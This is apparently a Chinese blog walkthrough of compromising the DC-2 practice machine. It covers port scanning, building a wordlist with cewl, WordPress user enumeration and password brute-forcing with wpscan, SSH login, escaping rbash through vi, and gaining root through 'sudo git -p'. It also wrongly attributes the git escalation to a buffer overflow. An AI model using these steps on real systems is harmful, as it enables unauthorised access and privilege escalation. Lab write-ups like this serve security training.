{"title":"DC-2靶机渗透","uid":"37d11d52d9cb6b4b91ce5e3863cfb8d6","slug":"DC-2靶机渗透","date":"2023-01-10T13:21:22.664Z","updated":"2023-01-08T08:27:42.728Z","comments":true,"path":"api/articles/DC-2靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-8oky1j.jpg","content":"<h1 id=\"DC-2靶机渗透全流程\"><a href=\"#DC-2靶机渗透全流程\" class=\"headerlink\" title=\"DC-2靶机渗透全流程\"></a>DC-2靶机渗透全流程</h1><h2 id=\"一-实验环境\"><a href=\"#一-实验环境\" class=\"headerlink\" title=\"一:实验环境\"></a>一:实验环境</h2><p>kali攻击机:192.168.2.103</p>\n<p>靶机:192.168.2.102</p>\n<h2 id=\"二-信息收集\"><a href=\"#二-信息收集\" class=\"headerlink\" title=\"二:信息收集\"></a>二:信息收集</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现:\"></a>主机发现:</h3><p><code>arp-scan -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101092120624.png\" alt=\"image-20230101092120624\"></p>\n<h3 id=\"端口发现\"><a href=\"#端口发现\" class=\"headerlink\" title=\"端口发现\"></a>端口发现</h3><p><code>masscan --rate=10000 -p 1-65535 192.168.2.102</code>,以10000的速率扫描靶机的所有端口</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101095351281.png\" alt=\"image-20230101095351281\">                                                                                                                                                                                                                </p>\n<p><code>nmap -p 80,7744 -sV -A 192.168.2.102   </code>,对指定端口的服务做综合详细扫描</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101095745597.png\" alt=\"image-20230101095745597\"></p>\n<h3 id=\"网站信息探测\"><a href=\"#网站信息探测\" class=\"headerlink\" title=\"网站信息探测\"></a>网站信息探测</h3><p>打不开192.168.2.108:80的原因:没有在本地设置hosts</p>\n<p>本地hosts文件位置:C:\\Windows\\System32\\drivers\\etc</p>\n<p>添加192.168.2.102 dc-2</p>\n<p>然后用<code>ipconfig /flushdns</code>更新dns缓存</p>\n<p>查询DNS缓存<code>ipconfig /displaydns</code></p>\n<p><strong>DNS解析顺序  本地DNS缓存&gt;hosts&gt;DNS服务器</strong></p>\n<p>之后就能成功访问目标界面了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101204240126.png\" alt=\"image-20230101204240126\"></p>\n<p>利用<code>Wappalyzer</code>插件查看网站信息</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101204402540.png\" alt=\"image-20230101204402540\"></p>\n<p>发现cms是wordpress</p>\n<p>找到flag1</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101204452510.png\" alt=\"image-20230101204452510\"></p>\n<h3 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h3><p><code>dirsearch -u http://dc-2/ -e*  </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101223704224.png\" alt=\"image-20230101223704224\"></p>\n<h2 id=\"三-渗透测试\"><a href=\"#三-渗透测试\" class=\"headerlink\" title=\"三:渗透测试\"></a>三:渗透测试</h2><p>通过flag1得知要用<strong>cewl</strong>工具收集网页信息生成密码破解口令字典</p>\n<h3 id=\"cewl\"><a href=\"#cewl\" class=\"headerlink\" title=\"cewl\"></a>cewl</h3><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.freebuf.com/articles/network/190128.html\">https://www.freebuf.com/articles/network/190128.html</a></p></blockquote>\n<p><strong>默认方法</strong></p>\n<p>输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;</code></pre>\n\n\n\n<p><strong>保存字典文件</strong></p>\n<p>为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt</code></pre>\n\n<p>我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cat dict.txt</code></pre>\n\n\n\n<p><strong>生成特定长度的字典</strong></p>\n<p>如果你想生成指定长度的密码字典，你可以使用-m选项来设置：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9</code></pre>\n\n<p>上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码</p>\n<p><strong>从网站中获取Email</strong></p>\n<p>你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n -e</code></pre>\n\n<p>此时，工具成功在网站中发现了一个Email地址</p>\n<p><strong>计算网站字典中重复的单词数量</strong></p>\n<p>如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c</code></pre>\n\n<p>Cewl可以直接统计出目标网站中重复的单词数量</p>\n<p><strong>增加爬取深度</strong></p>\n<p>如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3</code></pre>\n\n\n\n<p><strong>提取调试信息</strong></p>\n<p>你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug</code></pre>\n\n\n\n<p><strong>Verbose模式</strong></p>\n<p>为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v</code></pre>\n\n\n\n<p><strong>生成包含数字和字符的字典</strong></p>\n<p>如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers</code></pre>\n\n\n\n<p><strong>Cewl摘要&#x2F;基础认证</strong></p>\n<p>如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v</code></pre>\n\n<p>或者</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v</code></pre>\n\n<p>接收到的http响应码为200，并成功生成了字典</p>\n<p><strong>代理URL</strong></p>\n<p>如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;</code></pre>\n\n\n\n<p>使用cewl生成字典</p>\n<p><code>cewl http://dc-2 -w de-2.txt</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101215746028.png\" alt=\"image-20230101215746028\"></p>\n<h3 id=\"wpscan\"><a href=\"#wpscan\" class=\"headerlink\" title=\"wpscan\"></a>wpscan</h3><p>​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.freebuf.com/sectool/174663.html\">https://www.freebuf.com/sectool/174663.html</a></p>\n<p><a href=\"https://blog.csdn.net/liver100day/article/details/117585795\">https://blog.csdn.net/liver100day/article/details/117585795</a></p></blockquote>\n<p><strong>扫描WordPress站点</strong></p>\n<p>我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2</code></pre>\n\n<p>如果你不知道目标服务器的IP地址，你可以直接输入URL地址。</p>\n<p><strong>主题扫描</strong></p>\n<p>使用下列命令对主题进行扫描：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t</code></pre>\n\n<p>使用下列命令扫描主题中存在的漏洞：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt</code></pre>\n\n<p>枚举用户信息</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 -e u</code></pre>\n\n\n\n<p><strong>插件扫描</strong></p>\n<p>插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。</p>\n<p>我们可以使用下列命令扫描WordPress站点中安装的插件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p</code></pre>\n\n<p>接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp</code></pre>\n\n\n\n<p><strong>使用wpscan进行暴力破解</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt</code></pre>\n\n\n\n<p><strong>命令集合</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u</code></pre>\n\n\n\n<p>用wpscan收集用户信息</p>\n<p><code>wpscan --url http://dc-2 -e u</code>枚举用户信息</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101222437770.png\" alt=\"image-20230101222437770\"></p>\n<p>生成用户名字典</p>\n<p><code>cat &gt;&gt; dc-2-u.txt &lt;&lt; end</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101222650216.png\" alt=\"image-20230101222650216\"></p>\n<p>对http用户进行暴力破解</p>\n<p><code>wpscan --url http://dc-2 -P dc-2.txt</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101223247473.png\" alt=\"image-20230101223247473\"></p>\n<p>破解成功</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">| Username: jerry, Password: adipiscing\n| Username: tom, Password: parturient</code></pre>\n\n\n\n<p>利用用户信息进行登录</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101223831014.png\" alt=\"image-20230101223831014\"></p>\n<p>找到flag2</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101223907223.png\" alt=\"image-20230101223907223\"></p>\n<p>利用破解的账号尝试登录系统</p>\n<p>有时候一些程序用户很可能是系统用户</p>\n<p>利用ssh进行登录</p>\n<p><code>ssh -p 7744 tom@192.168.2.102</code></p>\n<p><code>ssh -p 7744 jerry@192.168.2.102</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101224554932.png\" alt=\"image-20230101224554932\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101224633451.png\" alt=\"image-20230101224633451\"></p>\n<p>成功登录tom</p>\n<p>发现flag3,但是同时发现很多指令不能使用</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101224822005.png\" alt=\"image-20230101224822005\"></p>\n<h3 id=\"rbash逃逸\"><a href=\"#rbash逃逸\" class=\"headerlink\" title=\"rbash逃逸\"></a>rbash逃逸</h3><p>一些参考文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://xz.aliyun.com/t/7642\">https://xz.aliyun.com/t/7642</a></p>\n<p><a href=\"https://blog.csdn.net/qq_43168364/article/details/111830233\">https://blog.csdn.net/qq_43168364/article/details/111830233</a></p></blockquote>\n<p>查看路径搜索变量PATH</p>\n<p><code>echo $PATH</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101225552725.png\" alt=\"image-20230101225552725\"></p>\n<p>查看还有哪些命令能用</p>\n<p><code>ls /home/tom/usr/bin</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101225740335.png\" alt=\"image-20230101225740335\"></p>\n<p>用vi打开flag3</p>\n<p><code>vi flag3.txt</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101225853234.png\" alt=\"image-20230101225853234\"></p>\n<p>打开后输入冒号,在vi编辑器的底部输入逃逸命令<code>!/bin/sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101233844408.png\" alt=\"image-20230101233844408\"></p>\n<p>但是我们直接输会遇到限制,过滤了&#x2F;</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101233750713.png\" alt=\"image-20230101233750713\"></p>\n<p>转变思路,用<code>set</code>设置环境变量</p>\n<p><code>:set shell=/bin/sh</code>通过set方式设置一个变量,把shell赋值给这个变量</p>\n<p><code>:shell</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101234309083.png\" alt=\"image-20230101234309083\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101234418711.png\" alt=\"image-20230101234418711\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101234355665.png\" alt=\"image-20230101234355665\"></p>\n<p>成功绕过</p>\n<p><strong>这里补充下正常Linux进入shell命令行的方法,直接输入<code>/bin/sh</code></strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101233408846.png\" alt=\"image-20230101233408846\"></p>\n<p>此时发现很多命令仍然不能使用</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101234637840.png\" alt=\"image-20230101234637840\"></p>\n<p>但可以发现此时提示的是命令没有找到,而不是权限不够,证明我们是能够使用这些命令的,只要路径正确</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101234929746.png\" alt=\"image-20230101234929746\"></p>\n<p>路径搜索变量<strong>PATH变量</strong>是Linux系统存储可执行文件搜索路径的地方，等价于Windows系统的Path变量</p>\n<p><code>echo $PATH</code></p>\n<p><code>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</code>  把变量输出为全局变量</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101235601040.png\" alt=\"image-20230101235601040\"></p>\n<p>此时就能正常使用命令了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101235756656.png\" alt=\"image-20230101235756656\"></p>\n<p>切换到jerry用户</p>\n<p><code>su - jerry</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102000344691.png\" alt=\"image-20230102000344691\"></p>\n<p>发现jerry只是个普通用户,想办法提权</p>\n<p>先找到flag4</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102000545562.png\" alt=\"image-20230102000545562\"></p>\n<p>通过提示知道了要用git提权</p>\n<p>通过<code>sudo -l</code>查看可利用的指令</p>\n<p>发现可以用root权限执行git</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102001721242.png\" alt=\"image-20230102001721242\"></p>\n<h3 id=\"利用git提权\"><a href=\"#利用git提权\" class=\"headerlink\" title=\"利用git提权\"></a>利用git提权</h3><p>这里用git提权，原理是git存在缓冲区溢出漏洞，在使用sudo git -p help时，不需要输入root密码即可以root权限执行这条命令。</p>\n<p><code>sudo git -p</code></p>\n<p>之后输入</p>\n<p><code>!/bin/bash</code></p>\n<p>这个-p的意思就是以分页的形式展示git的帮助信息,但是这里<strong>他会默认调用more来进行展示</strong></p>\n<p>参考之前的rbash逃逸</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102002931827.png\" alt=\"image-20230102002931827\"></p>\n<p>或者</p>\n<p><code>sudo git help config</code></p>\n<p>在末行命令模式输入 </p>\n<p><code>!/bin/bash 或 !&#39;sh&#39; </code></p>\n<p>完成提权</p>\n<p>拿到最终flag</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102003235295.png\" alt=\"image-20230102003235295\"></p>\n","text":"DC-2靶机渗透全流程一:实验环境kali攻击机:192.168.2.103 靶机:192.168.2.102 二:信息收集主机发现:arp-scan -l 端口发现masscan --rate=10000 -p 1-65535 192.168.2.102,以10000的速率扫描...","link":"","photos":[],"count_time":{"symbolsCount":"5.4k","symbolsTime":"5 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":7,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%85%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">DC-2靶机渗透全流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">一:实验环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">二:信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">主机发现:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">端口发现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">网站信息探测</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">目录扫描</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">三:渗透测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#cewl\"><span class=\"toc-text\">cewl</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wpscan\"><span class=\"toc-text\">wpscan</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#rbash%E9%80%83%E9%80%B8\"><span class=\"toc-text\">rbash逃逸</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8git%E6%8F%90%E6%9D%83\"><span 